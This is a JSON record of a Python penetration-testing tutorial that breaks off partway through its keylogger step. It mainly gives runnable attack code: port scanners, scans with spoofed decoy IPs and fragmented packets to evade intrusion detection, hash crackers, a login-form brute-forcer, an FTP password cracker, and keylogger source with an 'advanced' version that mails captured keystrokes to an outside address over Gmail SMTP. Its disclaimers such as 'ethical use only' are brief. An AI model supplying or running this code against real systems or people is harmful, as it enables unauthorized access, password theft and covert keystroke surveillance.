{
  "id": "python_penetration_testing",
  "title": "Python Scripting for Penetration Testing",
  "type": "tutorial",
  "steps": [
    {
      "id": "python_basics_for_hackers",
      "title": "Python Basics for Ethical Hackers",
      "content": "OBJECTIVE: Learn fundamental Python concepts essential for penetration testing and security scripting.\n\nACADEMIC BACKGROUND:\nPython is the de facto language for security tools and penetration testing due to its simplicity, extensive libraries, and cross-platform compatibility. Understanding Python fundamentals enables creation of custom security tools, automation of repetitive tasks, and development of proof-of-concept exploits.\n\nSTEP-BY-STEP PROCESS:\n\n1. Python Environment Setup:\n\nInstalling Python for Security Work:\n```bash\n# Check current Python version\npython3 --version\n\n# Install Python 3 (Ubuntu/Debian)\nsudo apt update\nsudo apt install python3 python3-pip\n\n# Install virtual environment\nsudo apt install python3-venv\n\n# Create isolated environment\npython3 -m venv pentest_env\nsource pentest_env/bin/activate\n\n# Install essential security libraries\npip install scapy requests beautifulsoup4 paramiko cryptography\n\n# Deactivate environment\ndeactivate\n```\n\n2. Basic Python Syntax:\n\nEssential Language Constructs:\n```python\n# Variables and data types\nname = \"ethical_hacker\"\nage = 25\nis_active = True\n\n# Lists (arrays)\ntargets = [\"192.168.1.1\", \"192.168.1.2\", \"10.0.0.1\"]\nports = [21, 22, 80, 443, 3389]\n\n# Dictionaries (key-value pairs)\nuser_creds = {\n    \"username\": \"admin\",\n    \"password\": \"P@ssw0rd123\",\n    \"role\": \"administrator\"\n}\n\n# Conditional statements\nif age >= 18:\n    print(\"Access granted\")\nelse:\n    print(\"Access denied\")\n\n# Loops\nfor target in targets:\n    print(f\"Scanning {target}\")\n\n# Functions\ndef scan_port(host, port):\n    # Port scanning logic here\n    return result\n\n# Exception handling\ntry:\n    result = scan_port(\"192.168.1.1\", 80)\nexcept Exception as e:\n    print(f\"Error: {e}\")\n```\n\n3. File Operations:\n\nReading and Writing Files:\n```python\n# Reading files\nwith open(\"passwords.txt\", \"r\") as file:\n    passwords = file.readlines()\n\n# Writing files\nwith open(\"results.txt\", \"w\") as file:\n    file.write(\"Scan completed\\n\")\n\n# Appending to files\nwith open(\"log.txt\", \"a\") as file:\n    file.write(f\"[{datetime.now()}] Scan started\\n\")\n\n# Reading wordlists for password cracking\nwith open(\"/usr/share/wordlists/rockyou.txt\", \"r\", encoding=\"latin-1\") as wordlist:\n    for password in wordlist:\n        password = password.strip()\n        # Try password logic here\n\n# Binary file operations (for exploits)\nwith open(\"exploit.bin\", \"rb\") as binary_file:\n    shellcode = binary_file.read()\n```\n\n4. Network Programming Basics:\n\nSocket Programming Fundamentals:\n```python\n# Import socket module\nimport socket\n\n# Create TCP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect to target\ntry:\n    sock.connect((\"192.168.1.1\", 80))\n    print(\"Connection successful\")\nexcept socket.error as e:\n    print(f\"Connection failed: {e}\")\n\n# Send HTTP request\nrequest = b\"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\"\nsock.send(request)\n\n# Receive response\nresponse = sock.recv(4096)\nprint(response.decode())\n\n# Close connection\nsock.close()\n\n# UDP socket example\nudp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nudp_sock.sendto(b\"Hello\", (\"192.168.1.1\", 53))\n```\n\n5. Regular Expressions:\n\nPattern Matching for Security:\n```python\n# Import re module\nimport re\n\n# Email extraction from text\ntext = \"Contact admin@example.com or user@test.org\"\nemails = re.findall(r\"[\\w\\.-]+@[\\w\\.-]+\\.[\\w]+\", text)\nprint(emails)  # ['admin@example.com', 'user@test.org']\n\n# IP address validation\nip_pattern = r\"^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$\"\nif re.match(ip_pattern, \"192.168.1.1\"):\n    print(\"Valid IP\")\n\n# Password strength checking\nstrong_password = r\"^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])[A-Za-z\\d@$!%*?&]{8,}$\"\nif re.match(strong_password, \"P@ssw0rd123\"):\n    print(\"Strong password\")\n\n# Extracting URLs from HTML\nhtml = \"<a href='http://example.com'>Link</a>\"\nurls = re.findall(r\"http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\\\(\\\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+\", html)\n```\n\n6. Command Line Arguments:\n\nScript Parameter Handling:\n```python\n# Import sys module\nimport sys\n\n# Basic argument handling\nif len(sys.argv) < 2:\n    print(\"Usage: python script.py <target>\")\n    sys.exit(1)\n\ntarget = sys.argv[1]\nprint(f\"Target: {target}\")\n\n# Advanced argument parsing\nimport argparse\n\nparser = argparse.ArgumentParser(description=\"Penetration Testing Tool\")\nparser.add_argument(\"target\", help=\"Target IP or hostname\")\nparser.add_argument(\"-p\", \"--ports\", nargs=\"+\", type=int, default=[80, 443], help=\"Ports to scan\")\nparser.add_argument(\"-v\", \"--verbose\", action=\"store_true\", help=\"Verbose output\")\n\nargs = parser.parse_args()\nprint(f\"Scanning {args.target} on ports {args.ports}\")\nif args.verbose:\n    print(\"Verbose mode enabled\")\n```\n\n7. Error Handling and Logging:\n\nRobust Security Scripting:\n```python\n# Import logging\nimport logging\n\n# Configure logging\nlogging.basicConfig(\n    filename=\"pentest.log\",\n    level=logging.INFO,\n    format=\"%(asctime)s - %(levelname)s - %(message)s\"\n)\n\n# Log different levels\nlogging.info(\"Scan started\")\nlogging.warning(\"Port scan detected\")\nlogging.error(\"Connection timeout\")\n\n# Custom exception classes\nclass PentestError(Exception):\n    pass\n\nclass PortScanError(PentestError):\n    pass\n\n# Exception handling with custom errors\ndef scan_target(target):\n    try:\n        # Scanning logic\n        if not valid_ip(target):\n            raise ValueError(\"Invalid IP address\")\n        # ... scan logic ...\n    except socket.timeout:\n        logging.error(f\"Timeout scanning {target}\")\n        raise PortScanError(f\"Timeout: {target}\")\n    except Exception as e:\n        logging.critical(f\"Unexpected error: {e}\")\n        raise PentestError(f\"Scan failed: {e}\")\n```\n\nWHAT TO LOOK FOR:\n- **Library Imports**: Essential modules for security tasks\n- **Error Handling**: Robust exception management\n- **Input Validation**: Sanitizing user inputs and targets\n- **Logging**: Comprehensive activity tracking\n- **Code Structure**: Modular and maintainable scripts\n- **Performance**: Efficient resource usage\n\nSECURITY IMPLICATIONS:\n- **Script Safety**: Avoiding self-compromising code\n- **Legal Compliance**: Authorized testing only\n- **Data Protection**: Secure handling of sensitive information\n- **System Impact**: Minimizing disruption during testing\n- **Detection Avoidance**: Understanding defensive measures\n- **Ethical Considerations**: Responsible security research\n\nCOMMON PITFALLS:\n- **Plain Text Credentials**: Hardcoded passwords in scripts\n- **Insufficient Validation**: Accepting malicious inputs\n- **Resource Exhaustion**: Infinite loops or memory leaks\n- **Poor Error Handling**: Crashing on unexpected conditions\n- **Lack of Logging**: No audit trail for activities\n- **Cross-Platform Issues**: Windows vs Linux compatibility\n\nTOOLS REFERENCE:\n- **Python 3**: Core language interpreter\n- **pip**: Package management system\n- **venv**: Virtual environment management\n- **argparse**: Command-line argument parsing\n- **logging**: Event logging framework\n- **re**: Regular expression engine\n- **socket**: Network programming library\n\nFURTHER READING:\n- Python Documentation: Official language reference\n- OWASP Python Security: Web security best practices\n- Socket Programming: Network communication fundamentals\n- Regular Expressions: Pattern matching techniques\n- Logging Best Practices: Effective debugging and monitoring\n- Ethical Hacking with Python: Security scripting methodologies",
      "tags": ["python", "scripting", "basics", "networking", "security"]
    },
    {
      "id": "network_scanning_scripts",
      "title": "Building Network Scanning Scripts",
      "content": "OBJECTIVE: Create Python scripts for network reconnaissance and port scanning using sockets and third-party libraries.\n\nACADEMIC BACKGROUND:\nNetwork scanning is fundamental to penetration testing, identifying live hosts, open ports, and running services. Python enables creation of custom scanners that can be more stealthy and flexible than off-the-shelf tools like Nmap.\n\nSTEP-BY-STEP PROCESS:\n\n1. Basic Port Scanner:\n\nTCP Connect Scan Implementation:\n```python\nimport socket\nimport sys\nfrom datetime import datetime\n\nclass PortScanner:\n    def __init__(self, target):\n        self.target = target\n        self.open_ports = []\n    \n    def scan_port(self, port):\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(1)\n            result = sock.connect_ex((self.target, port))\n            sock.close()\n            return result == 0\n        except:\n            return False\n    \n    def scan_range(self, start_port, end_port):\n        print(f\"Scanning {self.target} from port {start_port} to {end_port}\")\n        start_time = datetime.now()\n        \n        for port in range(start_port, end_port + 1):\n            if self.scan_port(port):\n                print(f\"Port {port}: OPEN\")\n                self.open_ports.append(port)\n        \n        end_time = datetime.now()\n        print(f\"Scan completed in {end_time - start_time}\")\n        return self.open_ports\n\n# Usage\nif __name__ == \"__main__\":\n    if len(sys.argv) < 2:\n        print(\"Usage: python port_scanner.py <target> [start_port] [end_port]\")\n        sys.exit(1)\n    \n    target = sys.argv[1]\n    start_port = int(sys.argv[2]) if len(sys.argv) > 2 else 1\n    end_port = int(sys.argv[3]) if len(sys.argv) > 3 else 1024\n    \n    scanner = PortScanner(target)\n    open_ports = scanner.scan_range(start_port, end_port)\n    print(f\"Open ports: {open_ports}\")\n```\n\n2. Host Discovery:\n\nPing Sweep Implementation:\n```python\nimport subprocess\nimport ipaddress\nimport threading\nimport queue\n\nclass HostDiscovery:\n    def __init__(self, network):\n        self.network = network\n        self.live_hosts = []\n        self.lock = threading.Lock()\n    \n    def ping_host(self, ip):\n        try:\n            result = subprocess.run(\n                ['ping', '-c', '1', '-W', '1', ip],\n                capture_output=True,\n                text=True\n            )\n            if result.returncode == 0:\n                with self.lock:\n                    self.live_hosts.append(ip)\n                    print(f\"Host {ip} is alive\")\n        except Exception as e:\n            pass  # Silently ignore errors\n    \n    def discover_hosts(self):\n        threads = []\n        \n        for ip in ipaddress.IPv4Network(self.network, strict=False):\n            thread = threading.Thread(target=self.ping_host, args=(str(ip),))\n            threads.append(thread)\n            thread.start()\n            \n            # Limit concurrent threads\n            if len(threads) >= 50:\n                for t in threads:\n                    t.join()\n                threads = []\n        \n        # Wait for remaining threads\n        for t in threads:\n            t.join()\n        \n        return self.live_hosts\n\n# Usage\nif __name__ == \"__main__\":\n    network = \"192.168.1.0/24\"\n    discovery = HostDiscovery(network)\n    live_hosts = discovery.discover_hosts()\n    print(f\"Live hosts: {live_hosts}\")\n```\n\n3. Service Detection:\n\nBanner Grabbing Script:\n```python\nimport socket\nimport re\n\nclass ServiceDetector:\n    def __init__(self):\n        self.services = {\n            21: \"FTP\",\n            22: \"SSH\", \n            23: \"Telnet\",\n            25: \"SMTP\",\n            53: \"DNS\",\n            80: \"HTTP\",\n            110: \"POP3\",\n            143: \"IMAP\",\n            443: \"HTTPS\",\n            993: \"IMAPS\",\n            995: \"POP3S\",\n            3389: \"RDP\"\n        }\n    \n    def grab_banner(self, host, port):\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(2)\n            sock.connect((host, port))\n            \n            # Send service-specific probe\n            if port in [80, 443]:\n                request = b\"GET / HTTP/1.0\\r\\n\\r\\n\"\n                sock.send(request)\n            elif port == 21:\n                # FTP doesn't need special probe\n                pass\n            else:\n                # Generic probe\n                sock.send(b\"\\r\\n\")\n            \n            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()\n            sock.close()\n            return banner\n        except:\n            return None\n    \n    def detect_service(self, host, port):\n        banner = self.grab_banner(host, port)\n        if banner:\n            # Try to identify service from banner\n            if \"SSH\" in banner.upper():\n                return \"SSH\"\n            elif \"HTTP\" in banner.upper():\n                return \"HTTP\"\n            elif \"FTP\" in banner.upper():\n                return \"FTP\"\n            else:\n                return f\"Unknown ({banner[:50]}...)\"\n        \n        # Fallback to port-based detection\n        return self.services.get(port, \"Unknown\")\n\n# Usage\nif __name__ == \"__main__\":\n    detector = ServiceDetector()\n    service = detector.detect_service(\"192.168.1.1\", 80)\n    print(f\"Service: {service}\")\n```\n\n4. Advanced Scanning with Scapy:\n\nPacket-Level Network Analysis:\n```python\n# Install scapy: pip install scapy\nfrom scapy.all import *\nimport sys\n\nclass AdvancedScanner:\n    def __init__(self):\n        # Enable IP forwarding if needed\n        pass\n    \n    def syn_scan(self, target, ports):\n        open_ports = []\n        for port in ports:\n            # Craft SYN packet\n            ip = IP(dst=target)\n            tcp = TCP(dport=port, flags=\"S\")\n            packet = ip/tcp\n            \n            # Send packet and wait for response\n            response = sr1(packet, timeout=1, verbose=0)\n            \n            if response:\n                if response.haslayer(TCP):\n                    if response[TCP].flags == 0x12:  # SYN-ACK\n                        open_ports.append(port)\n                        print(f\"Port {port}: OPEN\")\n                        \n                        # Send RST to close connection\n                        rst_packet = IP(dst=target)/TCP(dport=port, flags=\"R\")\n                        send(rst_packet, verbose=0)\n                    elif response[TCP].flags == 0x14:  # RST-ACK\n                        pass  # Closed port\n        \n        return open_ports\n    \n    def udp_scan(self, target, ports):\n        open_ports = []\n        for port in ports:\n            # Send UDP packet\n            udp_packet = IP(dst=target)/UDP(dport=port)\n            response = sr1(udp_packet, timeout=2, verbose=0)\n            \n            if response:\n                if response.haslayer(ICMP):\n                    if response[ICMP].type == 3 and response[ICMP].code == 3:\n                        pass  # Port closed\n                    else:\n                        open_ports.append(port)\n                        print(f\"Port {port}: OPEN\")\n            else:\n                # No response might indicate open/filtered\n                open_ports.append(port)\n                print(f\"Port {port}: OPEN/FILTERED\")\n        \n        return open_ports\n\n# Usage\nif __name__ == \"__main__\":\n    target = \"192.168.1.1\"\n    ports = [21, 22, 80, 443]\n    \n    scanner = AdvancedScanner()\n    print(\"SYN Scan:\")\n    tcp_open = scanner.syn_scan(target, ports)\n    print(\"UDP Scan:\")\n    udp_open = scanner.udp_scan(target, ports)\n```\n\n5. Stealth Scanning Techniques:\n\nAvoiding Detection:\n```python\nimport random\nimport time\n\nclass StealthScanner:\n    def __init__(self, target):\n        self.target = target\n    \n    def slow_scan(self, ports, delay=1):\n        \"\"\"Slow scanning to avoid IDS detection\"\"\"\n        open_ports = []\n        for port in ports:\n            time.sleep(delay + random.uniform(0, 1))  # Random delay\n            if self.check_port(port):\n                open_ports.append(port)\n                print(f\"Port {port}: OPEN\")\n        return open_ports\n    \n    def decoy_scan(self, real_target, ports, decoys):\n        \"\"\"Use decoy IPs to hide real scan source\"\"\"\n        for port in ports:\n            for decoy in decoys:\n                # Send scan from decoy IP (spoofed)\n                ip = IP(src=decoy, dst=real_target)\n                tcp = TCP(dport=port, flags=\"S\")\n                send(ip/tcp, verbose=0)\n                time.sleep(0.1)\n            \n            # Send real scan\n            ip = IP(dst=real_target)\n            tcp = TCP(dport=port, flags=\"S\")\n            response = sr1(ip/tcp, timeout=1, verbose=0)\n            \n            if response and response.haslayer(TCP):\n                if response[TCP].flags == 0x12:\n                    print(f\"Port {port}: OPEN\")\n    \n    def fragmented_scan(self, target, port):\n        \"\"\"Fragment packets to bypass simple firewalls\"\"\"\n        ip = IP(dst=target, flags=\"MF\")  # More fragments\n        tcp = TCP(dport=port, flags=\"S\")\n        \n        # Send fragmented SYN packet\n        send(ip/tcp, verbose=0)\n        \n        # This is simplified - real fragmentation requires\n        # careful offset and ID management\n\n# Usage\nscanner = StealthScanner(\"192.168.1.1\")\n# Slow scan with 2-second delays\nopen_ports = scanner.slow_scan([80, 443], delay=2)\n```\n\nWHAT TO LOOK FOR:\n- **Scan Types**: Connect vs SYN vs stealth scans\n- **Detection Evasion**: Timing and packet manipulation\n- **Performance**: Threading and asynchronous scanning\n- **Error Handling**: Network timeouts and exceptions\n- **Output Formatting**: Readable scan results\n- **Legal Compliance**: Authorized scanning only\n\nSECURITY IMPLICATIONS:\n- **Network Mapping**: Understanding target infrastructure\n- **Vulnerability Discovery**: Identifying exposed services\n- **Firewall Testing**: Assessing network defenses\n- **Intrusion Detection**: Triggering security monitoring\n- **Service Enumeration**: Determining running applications\n- **Attack Surface Analysis**: Mapping potential entry points\n\nCOMMON PITFALLS:\n- **Aggressive Scanning**: Triggering IDS/IPS alerts\n- **Unnecessary Traffic**: Network disruption during scans\n- **Incomplete Detection**: Missing filtered ports\n- **Resource Exhaustion**: Threading without limits\n- **Legal Violations**: Unauthorized network scanning\n- **Detection Evasion**: Overly complex stealth techniques\n\nTOOLS REFERENCE:\n- **socket**: Python network programming\n- **subprocess**: System command execution\n- **threading**: Concurrent scanning\n- **ipaddress**: IP network calculations\n- **scapy**: Packet manipulation and analysis\n- **nmap**: Professional scanner (Python integration)\n\nFURTHER READING:\n- TCP/IP Protocol Suite: Network communication fundamentals\n- Port Scanning Techniques: Nmap scanning methods\n- Intrusion Detection: Evasion and detection mechanisms\n- Network Security: Firewall and IDS technologies\n- Python Network Programming: Socket and protocol implementation\n- Ethical Scanning: Legal and responsible testing practices",
      "tags": ["python", "networking", "scanning", "ports", "sockets", "scapy"]
    },
    {
      "id": "password_cracking_scripts",
      "title": "Python Scripts for Password Cracking",
      "content": "OBJECTIVE: Develop Python scripts for password cracking using dictionary attacks, brute force, and hybrid approaches.\n\nACADEMIC BACKGROUND:\nPassword cracking scripts automate the process of testing authentication systems, identifying weak passwords, and demonstrating password security risks. Python's flexibility enables creation of custom crackers for various protocols and hash types.\n\nSTEP-BY-STEP PROCESS:\n\n1. Dictionary Attack Script:\n\nWordlist-Based Password Cracking:\n```python\nimport sys\nimport hashlib\n\nclass DictionaryAttacker:\n    def __init__(self, hash_file, wordlist_file):\n        self.hashes = self.load_hashes(hash_file)\n        self.wordlist = wordlist_file\n        self.cracked = {}\n    \n    def load_hashes(self, filename):\n        hashes = {}\n        with open(filename, 'r') as f:\n            for line in f:\n                line = line.strip()\n                if line:\n                    # Assume format: username:hash\n                    parts = line.split(':')\n                    if len(parts) == 2:\n                        username, hash_value = parts\n                        hashes[hash_value] = username\n        return hashes\n    \n    def crack_md5(self, target_hash, password):\n        \"\"\"Test MD5 hash\"\"\"\n        hashed = hashlib.md5(password.encode()).hexdigest()\n        return hashed == target_hash\n    \n    def crack_sha256(self, target_hash, password):\n        \"\"\"Test SHA256 hash\"\"\"\n        hashed = hashlib.sha256(password.encode()).hexdigest()\n        return hashed == target_hash\n    \n    def dictionary_attack(self):\n        print(f\"Starting dictionary attack with {len(self.hashes)} hashes\")\n        \n        with open(self.wordlist, 'r', encoding='latin-1') as f:\n            for line_num, password in enumerate(f, 1):\n                password = password.strip()\n                \n                if line_num % 1000 == 0:\n                    print(f\"Tested {line_num} passwords...\")\n                \n                for hash_value, username in self.hashes.items():\n                    if hash_value not in self.cracked:\n                        # Try different hash types\n                        if self.crack_md5(hash_value, password):\n                            self.cracked[hash_value] = password\n                            print(f\"CRACKED: {username} -> {password}\")\n                        elif self.crack_sha256(hash_value, password):\n                            self.cracked[hash_value] = password\n                            print(f\"CRACKED: {username} -> {password}\")\n                \n                if len(self.cracked) == len(self.hashes):\n                    break  # All cracked\n        \n        return self.cracked\n\n# Usage\nif __name__ == \"__main__\":\n    if len(sys.argv) != 3:\n        print(\"Usage: python dict_attack.py <hash_file> <wordlist>\")\n        sys.exit(1)\n    \n    attacker = DictionaryAttacker(sys.argv[1], sys.argv[2])\n    results = attacker.dictionary_attack()\n    \n    print(\"\\nFinal Results:\")\n    for hash_value, password in results.items():\n        username = attacker.hashes[hash_value]\n        print(f\"{username}: {password}\")\n```\n\n2. Brute Force Password Cracker:\n\nSystematic Character Combination Testing:\n```python\nimport itertools\nimport string\nimport hashlib\nfrom datetime import datetime\n\nclass BruteForceAttacker:\n    def __init__(self, target_hash, hash_type='md5', max_length=8):\n        self.target_hash = target_hash\n        self.hash_type = hash_type.lower()\n        self.max_length = max_length\n        self.chars = string.ascii_letters + string.digits + string.punctuation\n    \n    def hash_password(self, password):\n        if self.hash_type == 'md5':\n            return hashlib.md5(password.encode()).hexdigest()\n        elif self.hash_type == 'sha256':\n            return hashlib.sha256(password.encode()).hexdigest()\n        elif self.hash_type == 'sha1':\n            return hashlib.sha1(password.encode()).hexdigest()\n        else:\n            raise ValueError(f\"Unsupported hash type: {self.hash_type}\")\n    \n    def brute_force(self):\n        print(f\"Starting brute force attack on {self.hash_type} hash\")\n        print(f\"Character set: {len(self.chars)} characters\")\n        print(f\"Max length: {self.max_length}\")\n        \n        start_time = datetime.now()\n        attempts = 0\n        \n        for length in range(1, self.max_length + 1):\n            print(f\"Testing length {length}...\")\n            for combo in itertools.product(self.chars, repeat=length):\n                password = ''.join(combo)\n                attempts += 1\n                \n                if attempts % 100000 == 0:\n                    elapsed = datetime.now() - start_time\n                    print(f\"Attempts: {attempts}, Time: {elapsed}\")\n                \n                if self.hash_password(password) == self.target_hash:\n                    end_time = datetime.now()\n                    print(f\"\\nPASSWORD FOUND: {password}\")\n                    print(f\"Attempts: {attempts}\")\n                    print(f\"Time: {end_time - start_time}\")\n                    return password\n        \n        print(\"Password not found within length limit\")\n        return None\n\n# Usage\nif __name__ == \"__main__\":\n    target_hash = \"5f4dcc3b5aa765d61d8327deb882cf99\"  # MD5 of 'password'\n    attacker = BruteForceAttacker(target_hash, 'md5', 6)\n    result = attacker.brute_force()\n```\n\n3. Hybrid Attack Script:\n\nCombining Dictionary and Brute Force:\n```python\nimport hashlib\n\nclass HybridAttacker:\n    def __init__(self, target_hash, wordlist_file):\n        self.target_hash = target_hash\n        self.wordlist_file = wordlist_file\n    \n    def apply_rules(self, base_word):\n        \"\"\"Apply common password rules\"\"\"\n        rules = [\n            lambda w: w,  # Original\n            lambda w: w + '123',  # +123\n            lambda w: w + '!',  # +!\n            lambda w: w.upper(),  # Uppercase\n            lambda w: w.lower(),  # Lowercase\n            lambda w: w.capitalize(),  # Capitalize\n            lambda w: w + '2019',  # +year\n            lambda w: w + '2020',  # +year\n            lambda w: '123' + w,  # 123+\n            lambda w: '!' + w,  # !+\n        ]\n        \n        variations = []\n        for rule in rules:\n            variations.append(rule(base_word))\n        \n        # Leet speak substitutions\n        leet = str.maketrans('aeiot', '@3107')\n        variations.append(base_word.translate(leet))\n        \n        return variations\n    \n    def crack_md5(self, password):\n        return hashlib.md5(password.encode()).hexdigest() == self.target_hash\n    \n    def hybrid_attack(self):\n        print(\"Starting hybrid attack...\")\n        \n        with open(self.wordlist_file, 'r', encoding='latin-1') as f:\n            for base_word in f:\n                base_word = base_word.strip()\n                \n                # Test base word\n                if self.crack_md5(base_word):\n                    return base_word\n                \n                # Test variations\n                for variation in self.apply_rules(base_word):\n                    if self.crack_md5(variation):\n                        return variation\n        \n        return None\n\n# Usage\nattacker = HybridAttacker(\"5f4dcc3b5aa765d61d8327deb882cf99\", \"rockyou.txt\")\nresult = attacker.hybrid_attack()\nif result:\n    print(f\"Password found: {result}\")\nelse:\n    print(\"Password not found\")\n```\n\n4. Online Password Cracking:\n\nTesting Live Authentication Services:\n```python\nimport requests\nimport time\n\nclass OnlineCracker:\n    def __init__(self, target_url, username_field, password_field):\n        self.target_url = target_url\n        self.username_field = username_field\n        self.password_field = password_field\n        self.session = requests.Session()\n    \n    def attempt_login(self, username, password):\n        data = {\n            self.username_field: username,\n            self.password_field: password\n        }\n        \n        try:\n            response = self.session.post(self.target_url, data=data, timeout=5)\n            \n            # Check for successful login indicators\n            if \"Welcome\" in response.text or \"Dashboard\" in response.text:\n                return True\n            elif \"Invalid\" in response.text or \"Failed\" in response.text:\n                return False\n            else:\n                # Unknown response - might be rate limited\n                return None\n        except requests.exceptions.RequestException:\n            return None\n    \n    def crack_password(self, username, wordlist_file, delay=1):\n        print(f\"Starting online attack against {username}\")\n        \n        with open(wordlist_file, 'r', encoding='latin-1') as f:\n            for password in f:\n                password = password.strip()\n                \n                result = self.attempt_login(username, password)\n                \n                if result is True:\n                    print(f\"\\nSUCCESS: {username}:{password}\")\n                    return password\n                elif result is False:\n                    print(f\"Failed: {password}\")\n                else:\n                    print(f\"Unknown response for: {password}\")\n                \n                time.sleep(delay)  # Rate limiting\n        \n        return None\n\n# Usage (ethical use only)\ncracker = OnlineCracker(\n    \"http://example.com/login\",\n    \"username\",\n    \"password\"\n)\nresult = cracker.crack_password(\"admin\", \"passwords.txt\")\n```\n\n5. FTP Password Cracker:\n\nProtocol-Specific Authentication Testing:\n```python\nimport ftplib\nimport socket\n\nclass FTPCracker:\n    def __init__(self, target_host, username):\n        self.target_host = target_host\n        self.username = username\n    \n    def test_password(self, password):\n        try:\n            ftp = ftplib.FTP(self.target_host, timeout=5)\n            ftp.login(self.username, password)\n            ftp.quit()\n            return True\n        except ftplib.error_perm:\n            return False\n        except (socket.timeout, socket.error):\n            return None  # Connection issue\n    \n    def crack_ftp(self, wordlist_file):\n        print(f\"Cracking FTP password for {self.username}@{self.target_host}\")\n        \n        with open(wordlist_file, 'r', encoding='latin-1') as f:\n            for password in f:\n                password = password.strip()\n                \n                result = self.test_password(password)\n                \n                if result is True:\n                    print(f\"\\nFTP CRACKED: {self.username}:{password}\")\n                    return password\n                elif result is False:\n                    print(f\"Failed: {password}\")\n                else:\n                    print(f\"Connection issue with: {password}\")\n        \n        return None\n\n# Usage\ncracker = FTPCracker(\"192.168.1.1\", \"anonymous\")\nresult = cracker.crack_ftp(\"passwords.txt\")\n```\n\nWHAT TO LOOK FOR:\n- **Hash Types**: Different algorithm support\n- **Wordlist Quality**: Comprehensive password dictionaries\n- **Rate Limiting**: Avoiding account lockouts\n- **Error Handling**: Network and protocol exceptions\n- **Performance**: Efficient password testing\n- **Legal Compliance**: Authorized testing only\n\nSECURITY IMPLICATIONS:\n- **Password Strength Assessment**: Identifying weak passwords\n- **Account Security Testing**: Authentication system validation\n- **Brute Force Prevention**: Lockout mechanism evaluation\n- **Password Policy Enforcement**: Complexity requirement testing\n- **Credential Stuffing Risks**: Reused password vulnerabilities\n- **Authentication Bypass**: Alternative access method discovery\n\nCOMMON PITFALLS:\n- **Account Lockouts**: Excessive failed attempts\n- **Rate Limiting**: IP-based blocking\n- **Detection**: Security monitoring alerts\n- **Resource Exhaustion**: System slowdown during cracking\n- **Legal Issues**: Unauthorized password testing\n- **Data Exposure**: Logging sensitive information\n\nTOOLS REFERENCE:\n- **hashlib**: Python cryptographic hashing\n- **itertools**: Combinatorial generation\n- **requests**: HTTP client for web authentication\n- **ftplib**: FTP protocol client\n- **paramiko**: SSH authentication testing\n- **string**: Character set definitions\n\nFURTHER READING:\n- Password Cracking Techniques: Attack methodologies\n- Hash Algorithms: Cryptographic hash functions\n- Authentication Protocols: Login mechanism analysis\n- Rate Limiting: Brute force prevention techniques\n- Ethical Cracking: Legal and responsible testing\n- Password Security: Strong password creation and policies",
      "tags": ["python", "passwords", "cracking", "dictionary", "brute-force", "authentication"]
    },
    {
      "id": "keylogger_implementation",
      "title": "Building a Python Keylogger",
      "content": "OBJECTIVE: Create a Python keylogger for monitoring keyboard input and understanding input capture techniques.\n\nACADEMIC BACKGROUND:\nKeyloggers capture keystrokes to monitor user activity, often used in penetration testing to demonstrate input interception risks. Understanding keylogger implementation helps security professionals identify and prevent such threats.\n\nSTEP-BY-STEP PROCESS:\n\n1. Basic Keylogger with pynput:\n\nKeyboard Input Capture:\n```python\nfrom pynput.keyboard import Key, Listener\nimport logging\n\nclass Keylogger:\n    def __init__(self, log_file=\"keylog.txt\"):\n        self.log_file = log_file\n        self.logger = logging.getLogger('keylogger')\n        self.logger.setLevel(logging.DEBUG)\n        \n        # Create file handler\n        handler = logging.FileHandler(log_file)\n        handler.setLevel(logging.DEBUG)\n        \n        # Create formatter\n        formatter = logging.Formatter('%(asctime)s - %(message)s')\n        handler.setFormatter(formatter)\n        \n        self.logger.addHandler(handler)\n    \n    def on_press(self, key):\n        try:\n            # Log regular characters\n            self.logger.info(f'Pressed: {key.char}')\n        except AttributeError:\n            # Log special keys\n            if key == Key.space:\n                self.logger.info('Pressed: [SPACE]')\n            elif key == Key.enter:\n                self.logger.info('Pressed: [ENTER]')\n            elif key == Key.tab:\n                self.logger.info('Pressed: [TAB]')\n            elif key == Key.backspace:\n                self.logger.info('Pressed: [BACKSPACE]')\n            elif key == Key.shift:\n                self.logger.info('Pressed: [SHIFT]')\n            elif key == Key.ctrl_l or key == Key.ctrl_r:\n                self.logger.info('Pressed: [CTRL]')\n            elif key == Key.alt_l or key == Key.alt_r:\n                self.logger.info('Pressed: [ALT]')\n            else:\n                self.logger.info(f'Pressed: [{key}]')\n    \n    def on_release(self, key):\n        # Stop listener on ESC\n        if key == Key.esc:\n            return False\n    \n    def start(self):\n        print(f\"Keylogger started. Logging to {self.log_file}\")\n        print(\"Press ESC to stop\")\n        \n        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:\n            listener.join()\n\n# Usage\nif __name__ == \"__main__\":\n    keylogger = Keylogger()\n    keylogger.start()\n```\n\n2. Advanced Keylogger Features:\n\nEnhanced Input Monitoring:\n```python\nfrom pynput.keyboard import Key, Listener\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\nimport threading\nimport time\n\nclass AdvancedKeylogger:\n    def __init__(self, log_file=\"keylog.txt\", email_interval=60):\n        self.log_file = log_file\n        self.email_interval = email_interval\n        self.log = \"\"\n        self.start_time = time.time()\n        \n        # Email configuration (for educational purposes only)\n        self.email_address = \"your_email@example.com\"\n        self.email_password = \"your_password\"\n        self.send_to = \"recipient@example.com\"\n    \n    def callback(self, event):\n        global log\n        name = event.name\n        \n        if len(name) > 1:\n            # Special keys\n            if name == \"space\":\n                name = \" \"\n            elif name == \"enter\":\n                name = \"[ENTER]\\n\"\n            elif name == \"decimal\":\n                name = \".\"\n            else:\n                name = f\"[{name.upper()}]\"\n        \n        self.log += name\n    \n    def send_email(self, message):\n        try:\n            server = smtplib.SMTP('smtp.gmail.com', 587)\n            server.starttls()\n            server.login(self.email_address, self.email_password)\n            \n            msg = MIMEMultipart()\n            msg['From'] = self.email_address\n            msg['To'] = self.send_to\n            